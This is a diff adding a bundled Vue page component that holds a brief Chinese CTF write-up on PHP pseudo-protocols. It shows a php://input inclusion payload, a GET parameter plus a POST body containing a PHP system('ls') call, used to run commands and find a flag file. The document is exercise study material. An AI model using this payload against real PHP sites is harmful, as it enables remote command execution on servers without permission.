@@ -1,0 +1,4 @@
+import{_ as e,o as t,c as s,e as a}from"./app-3b511de6.js";const n={},d=a(`<p>#PHP伪协议</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?url=php://input        -- GET请求的url中拼接伪协议
+&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>![[Pasted image 20230116163051.png]] 得到文件名 <code>ctf_go_go_go</code> 之后输入</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?url=ctf_go_go_go
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>得到 ![[Pasted image 20230116163212.png]]</p>`,5),i=[d];function c(l,o){return t(),s("div",null,i)}const p=e(n,[["render",c],["__file","web3.html.vue"]]);export{p as default};
